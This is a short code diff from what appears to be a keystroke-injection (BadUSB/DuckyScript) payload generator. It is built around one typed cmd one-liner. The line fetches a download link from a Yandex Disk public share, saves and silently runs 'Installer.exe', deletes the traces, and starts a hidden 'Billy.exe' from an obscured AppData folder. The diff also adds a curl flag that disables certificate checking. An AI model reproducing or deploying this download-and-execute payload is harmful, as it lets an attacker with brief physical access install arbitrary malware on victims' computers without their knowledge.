@@ -71,7 +71,7 @@ STRING cmd
 DELAY 500
 ENTER
 DELAY 750
-STRING curl -s https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key={link} > temp.txt & powershell -command "Get-Content "temp.txt" | Select-String -Pattern 'https://downloader.disk.yandex.ru/disk/.+?=v3' | ForEach-Object {{$_.Matches.value}}" > temp2.txt & for /f "delims=" %u in (temp2.txt) do curl -s -L "%u" -o Installer.exe & del temp.txt & del temp2.txt & start "" /wait Installer.exe & del Installer.exe & "C:/Users/%username%/AppData/Local/Comms/Unistore/data/5/a/billy/Billy.exe" > Nul & exit
+STRING curl -k -s https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key={link} > temp.txt & powershell -command "Get-Content "temp.txt" | Select-String -Pattern 'https://downloader.disk.yandex.ru/disk/.+?=v3' | ForEach-Object {{$_.Matches.value}}" > temp2.txt & for /f "delims=" %u in (temp2.txt) do curl -k -s -L "%u" -o Installer.exe & del temp.txt & del temp2.txt & start "" /wait Installer.exe & del Installer.exe & "C:/Users/%username%/AppData/Local/Comms/Unistore/data/5/a/billy/Billy.exe" > Nul & exit
 DELAY 2000
 ENTER"""
 
